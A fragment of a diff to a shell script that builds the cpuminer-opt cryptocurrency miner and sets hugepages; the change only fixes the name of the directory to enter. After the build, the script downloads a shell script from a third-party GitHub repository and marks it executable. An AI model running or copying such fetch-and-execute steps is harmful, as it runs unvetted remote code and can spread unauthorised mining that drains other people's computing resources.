@@ -4,7 +4,7 @@ apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-de
 sudo sysctl vm.nr_hugepages=128 &&
 cd /usr/local/src/ &&
 git clone https://github.com/JayDDee/cpuminer-opt cpuminer &&
-cd cpuminer-opt &&
+cd cpuminer &&
 ./build.sh &&
 wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/tra2.sh &&
 chmod +x tra2.sh &&
